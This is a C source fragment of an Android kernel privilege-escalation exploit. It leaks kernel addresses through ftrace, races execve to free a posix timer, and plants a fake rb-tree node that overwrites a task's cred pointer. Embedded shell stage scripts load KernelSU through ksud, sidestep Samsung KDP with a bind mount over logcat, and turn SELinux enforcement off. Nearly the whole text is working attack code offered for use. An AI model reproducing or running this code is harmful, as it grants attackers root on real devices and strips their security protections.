static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
                         unsigned long long vslab,
                         unsigned long long *out_pfn)
{
    unsigned long long pend[64];
    int np = 0;

    for (size_t i = 8; i + 40 <= n; i += 4)
    {
        if ((int)u32(b, i - 4) != pid)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_alloc)
        {
            unsigned long long pfn = u64(b, i);

            if (pfn < (1ULL << 26) && u32(b, i + 8) == SLAB_ORDER)
            {
                if (np == 64)
                    memmove(pend, pend + 1, 63 * sizeof(pend[0])), np--;
                pend[np++] = pfn;
            }
            continue;
        }
        if ((u64(b, i) & 0x1fffffULL) != TIMER_SITE_LOW21 ||
            u64(b, i + ALLOC_REQ_OFF) != TIMER_ALLOC ||
            u64(b, i + ALLOC_REQ_OFF + 8) != TIMER_ALLOC)
            continue;
        {
            unsigned long long ptr = u64(b, i + 8);

            if (!is_kernel_ptr(ptr) || (ptr & SLAB_MASK) != vslab)
                continue;
            if (np > 0)
            {
                *out_pfn = pend[np - 1];
                return 1;
            }
            return 0;
        }
    }
    return 0;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 40 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        if (u64(b, i + ALLOC_REQ_OFF) != TIMER_ALLOC ||
            u64(b, i + ALLOC_REQ_OFF + 8) != TIMER_ALLOC ||
            !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 40 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + ALLOC_PTR_TO_REQ) != CRED_REQ ||
            u64(b, i + ALLOC_PTR_TO_REQ + 8) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 40 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + ALLOC_REQ_OFF);
        alloc = u64(b, i + ALLOC_REQ_OFF + 8);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
            req != 0x1640 && alloc != 0x1640)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}



struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID
 * slab-order page_alloc pfns.  Partial-slab pairings are noise; the true
 * base wins by roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & SLAB_MASK;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != (int)SLAB_ORDER ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << PAGE_SHIFT);
            unsigned h = (unsigned)((base >> PAGE_SHIFT) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    unsigned long long site0 = 0;
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &site0);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != (int)SLAB_ORDER ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & SLAB_MASK;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
        if (bestc < 4)
            return 0;
        /*
         * The fake endgame resolves symbols by slide before its first plant
         * (DEFEX creds_hash, selinux_state), so the slide has to exist here.
         * run_plant() recomputes it from the site it captures, which stays
         * authoritative per write; this is only the pre-plant value.
         */
        if (site0)
            g_slide = site0 - STATIC_TIMER_SITE;
        return best;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && !g_probe &&
            timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    /*
     * The child must read the go byte, wait for the lockers, spin, execve,
     * and the exec'd image then runs main() as far as its argv[0] check,
     * which mallocs 48 MB first.  That is far more than the original 400 ms
     * budget, so poll for 20 s before giving up.
     */
    for (int i = 0; i < 100000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed slab page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/*
 * Samsung endgame, ported from SamTimer / BuSung-dev Root-My-Galaxy:
 *
 *   - the worker is already in u:r:init:s0 and has bind-mounted the bundled
 *     diabl0w/KernelSU ksud over /system/bin/logcat in a private mount
 *     namespace, so KDP does not SIGKILL a directly-exec'ed kdp-variant ksud;
 *   - the manager is pinned (me.weishu.kernelsu, samsung-v*), so there is no
 *     pm/find/unzip ladder and no --version probe (a direct exec gets
 *     KDP-killed and only adds noise);
 *   - the bundled ksud supports --kmi/--allow-shell; --allow-shell is
 *     required because the app's user service runs as the shell user and
 *     drives `su -c` for every post-load command;
 *   - SELinux is left to ksud's own restore.  Re-enforcing from userspace
 *     races ksud and can kill system_server on OneUI.
 */
static void write_ksu_script_samsung(void)
{
    static const char script_head[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\"\n"
        "echo \"[ksu] ctx=$(cat /proc/self/attr/current 2>/dev/null)\"\n"
        "PKG='";
    static const char script_tail[] =
        "KSUD=/data/local/tmp/w/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
        "if [ ! -x \"$KSUD\" ]; then\n"
        "  echo '[ksu] ksud missing'; echo KSU_MISSING; exit 1\n"
        "fi\n"
        "echo \"[ksu] ksud=$KSUD size=$(stat -c %s \"$KSUD\" 2>/dev/null)\"\n"
        /* late-load registers the module asynchronously; probe with a
         * settle delay like the reference does. */
        "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null "
        "&& echo yes || echo no; }\n"
        "LIVE=$(live)\n"
        "echo \"[ksu] live_initial=$LIVE\"\n"
        "if [ \"$LIVE\" = yes ]; then\n"
        "  echo '[ksu] already_live'; echo KSU_LOADED; exit 0\n"
        "fi\n"
        /* If the C-side bind mount worked, /system/bin/logcat IS ksud
         * (KDP-safe path).  Real logcat never prints ksud/KernelSU, and
         * the diabl0w build identifies itself as samsung-vX.Y. */
        "if /system/bin/logcat --version 2>/dev/null | "
        "grep -qiE 'ksud|kernelsu|samsung-v'; then\n"
        "  echo '[ksu] bind mount active, exec via logcat path'\n"
        "  /system/bin/logcat late-load --allow-shell --kmi \"$KMI\" "
        "--package-name \"$PKG\"\n"
        "  RC=$?\n"
        "else\n"
        "  echo '[ksu] no bind mount; direct exec (KDP may kill)'\n"
        "  \"$KSUD\" late-load --allow-shell --kmi \"$KMI\" "
        "--package-name \"$PKG\"\n"
        "  RC=$?\n"
        "fi\n"
        "echo \"[ksu] late-load rc=$RC\"\n"
        "i=0\n"
        "while [ $i -lt 50 ]; do\n"
        "  grep -q '^kernelsu ' /proc/modules && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if grep -q '^kernelsu ' /proc/modules; then\n"
        "  echo '[ksu] module live'; echo KSU_LOADED\n"
        "else\n"
        "  echo '[ksu] module NOT live'; echo KSU_MISSING\n"
        "fi\n"
        /* Evidence that must survive a panic: the module's klog (KDP/RKP
         * detection, hook installation) is only in dmesg. */
        "dmesg | tail -n 4000 > /data/local/tmp/w/dmesg_after_load.log "
        "2>&1\n"
        "echo \"[ksu] enf=$(getenforce)\"\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script_head, sizeof(script_head) - 1);
    (void)!write(fd, g_cfg.samsung_package,
                 strlen(g_cfg.samsung_package));
    (void)!write(fd, "'\nKMI=", 6);
    (void)!write(fd, g_cfg.ksu_kmi, strlen(g_cfg.ksu_kmi));
    (void)!write(fd, "\n", 1);
    (void)!write(fd, script_tail, sizeof(script_tail) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

/* GhostLock's final stage, reduced to its root-child handoff. */
static void write_ksu_script(void)
{
    if (g_samsung_stage)
    {
        write_ksu_script_samsung();
        return;
    }

    static const char script_head[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
        /* Try upstream KernelSU, KernelSU-Next and SukiSU Ultra first. */
        "PKGS='me.weishu.kernelsu com.rifsxd.ksunext com.sukisu.ultra'\n";
    static const char script_tail[] =
        "KSUD=''\n"
        "PKG=''\n"
        "APK=''\n"
        "lib_for() {\n"
        "  d=$(dirname \"$1\")\n"
        "  for c in \"$d/lib/arm64/libksud.so\" "
        "\"$d/lib/arm64-v8a/libksud.so\"; do\n"
        "    if [ -x \"$c\" ]; then echo \"$c\"; return 0; fi\n"
        "  done\n"
        /* Repackagers may rename libksud.so.  ksud is a large executable
         * and is the only native lib containing the late-load marker. */
        "  [ -d \"$d/lib/arm64\" ] || return 1\n"
        "  for c in $(find \"$d/lib/arm64\" -name '*.so' -size +2M "
        "2>/dev/null); do\n"
        "    [ -x \"$c\" ] || continue\n"
        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
        "    echo \"$c\"; return 0\n"
        "  done\n"
        "  return 1\n"
        "}\n"
        "for p in $PKGS; do\n"
        "  a=$(pm path \"$p\" 2>/dev/null | head -n1 | cut -d: -f2)\n"
        "  [ -n \"$a\" ] || continue\n"
        "  [ -n \"$APK\" ] || { APK=\"$a\"; PKG=\"$p\"; }\n"
        "  c=$(lib_for \"$a\") && { KSUD=\"$c\"; PKG=\"$p\"; APK=\"$a\"; "
        "break; }\n"
        "done\n"
        /* Repackaged managers (e.g. spoofed KernelSU-Next or SukiSU) can
         * use any package name, and pm is not always usable from this
         * context.  As uid 0 we can read /data/app directly, so scan for
         * libksud.so and derive the package from its install dir.  Prefer
         * a manager installed for user 0 over one in another user. */
        "if [ -z \"$KSUD\" ]; then\n"
        "  for c in $(find /data/app -name libksud.so 2>/dev/null | "
        "grep '/lib/arm64'); do\n"
        "    [ -x \"$c\" ] || continue\n"
        "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
        "    b=$(basename \"$d\"); p=${b%%-*}\n"
        "    if [ -z \"$KSUD\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"\n"
        "    fi\n"
        "    if [ -d \"/data/user/0/$p\" ] || "
        "[ -d \"/data/user_de/0/$p\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"; break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        /* Same scan, but for repackagers that renamed the ksud library. */
        "if [ -z \"$KSUD\" ]; then\n"
        "  for c in $(find /data/app -path '*/lib/arm64/*.so' "
        "-size +2M 2>/dev/null); do\n"
        "    [ -x \"$c\" ] || continue\n"
        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
        "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
        "    b=$(basename \"$d\"); p=${b%%-*}\n"
        "    if [ -z \"$KSUD\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"\n"
        "    fi\n"
        "    if [ -d \"/data/user/0/$p\" ] || "
        "[ -d \"/data/user_de/0/$p\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"; break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        /* pm fallback for environments where the direct scan is denied. */
        "if [ -z \"$KSUD\" ]; then\n"
        "  for line in $(pm list packages --user 0 -f 2>/dev/null); do\n"
        "    a=${line#package:}; a=${a%=*}\n"
        "    c=$(lib_for \"$a\") || continue\n"
        "    KSUD=\"$c\"; APK=\"$a\"; PKG=${line##*=}\n"
        "    break\n"
        "  done\n"
        "fi\n"
        /* Some installs keep native libs compressed inside the APK. */
        "if [ -z \"$KSUD\" ] && [ -n \"$APK\" ] && "
        "command -v unzip >/dev/null 2>&1; then\n"
        "  for e in lib/arm64-v8a/libksud.so lib/arm64/libksud.so; do\n"
        "    unzip -p \"$APK\" \"$e\" > /data/local/tmp/libksud.so 2>/dev/null\n"
        "    if [ -s /data/local/tmp/libksud.so ]; then\n"
        "      chmod 755 /data/local/tmp/libksud.so\n"
        "      KSUD=/data/local/tmp/libksud.so\n"
        "      break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        "if [ ! -x \"$KSUD\" ]; then\n"
        "  for c in /data/local/tmp/ksud /data/adb/ksu/bin/ksud; do\n"
        "    if [ -x \"$c\" ]; then KSUD=\"$c\"; break; fi\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$PKG\" ]; then\n"
        "  for p in $PKGS; do\n"
        "    if pm list packages --user 0 2>/dev/null | "
        "grep -qx \"package:$p\"; then PKG=\"$p\"; break; fi\n"
        "  done\n"
        "fi\n"
        "[ -n \"$PKG\" ] || PKG=me.weishu.kernelsu\n"
        "if [ ! -x \"$KSUD\" ]; then\n"
        "  echo \"[ksu] ksud missing (tried: $PKGS, any user-0 package "
        "with libksud.so, /data/local/tmp/ksud, /data/adb/ksu/bin/ksud)\"\n"
        "  echo KSU_MISSING\n"
        "  exit 1\n"
        "fi\n"
        "KSUVER=$(\"$KSUD\" --version 2>&1 | head -n1)\n"
        "echo \"[ksu] manager=$PKG ksud=$KSUD version=$KSUVER\"\n"
        "loaded() { grep -q '^kernelsu ' /proc/modules; }\n"
        "try_load() {\n"
        "  echo \"[ksu] late-load $*\"\n"
        "  \"$KSUD\" late-load \"$@\" 2>&1\n"
        "  echo \"[ksu] late-load rc=$?\"\n"
        "  loaded && return 0\n"
        "  sleep 0.5\n"
        "  return 1\n"
        "}\n"
        /* A module left over from an earlier run cannot be replaced by
         * init_module (it fails with EEXIST).  Loading is pointless then,
         * and a uapi mismatch is exactly what makes the manager report
         * "not installed", so detect it and tell the user to reboot. */
        "PRELOADED=0\n"
        "loaded && PRELOADED=1\n"
        /* Fork CLIs differ; try the flags each one is most likely to know. */
        "if [ \"$PRELOADED\" = 0 ]; then\n"
        "  try_load --kmi \"$KMI\" --allow-shell --package-name \"$PKG\" || \\\n"
        "  try_load --kmi \"$KMI\" --package-name \"$PKG\" || \\\n"
        "  try_load --allow-shell --package-name \"$PKG\" || \\\n"
        "  try_load --package-name \"$PKG\" || \\\n"
        "  try_load --kmi \"$KMI\" || \\\n"
        "  try_load\n"
        "fi\n"
        "i=0\n"
        "while [ $i -lt 100 ]; do\n"
        "  loaded && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if loaded; then\n"
        /* Compare the manager's own uapi with the loaded module's.  Newer
         * ksud builds expose it via "debug info"; older ones leave it
         * empty and we keep the old behaviour. */
        "  want=$(echo \"$KSUVER\" | "
        "sed -n 's/.*uapi: *\\([0-9][0-9]*\\).*/\\1/p')\n"
        "  got=$(\"$KSUD\" debug info 2>/dev/null | "
        "sed -n 's/^uapi_version: *\\([0-9][0-9]*\\).*/\\1/p')\n"
        "  echo \"[ksu] uapi manager=${want:-?} kernel=${got:-?} "
        "preloaded=$PRELOADED\"\n"
        "  if [ -n \"$want\" ] && [ -n \"$got\" ] && "
        "[ \"$want\" != \"$got\" ]; then\n"
        "    echo \"[ksu] loaded module is incompatible (uapi $got, "
        "manager needs $want); reboot, then run again\"\n"
        "    echo KSU_STALE\n"
        "  else\n"
        "    echo KSU_LOADED\n"
        "  fi\n"
        "else\n"
        "  echo KSU_MISSING\n"
        "fi\n"
        "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "echo \"[ksu] enforce=$(getenforce)\"\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script_head, sizeof(script_head) - 1);
    (void)!write(fd, "KMI=", 4);
    (void)!write(fd, g_cfg.ksu_kmi, strlen(g_cfg.ksu_kmi));
    (void)!write(fd, "\n", 1);
    (void)!write(fd, script_tail, sizeof(script_tail) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
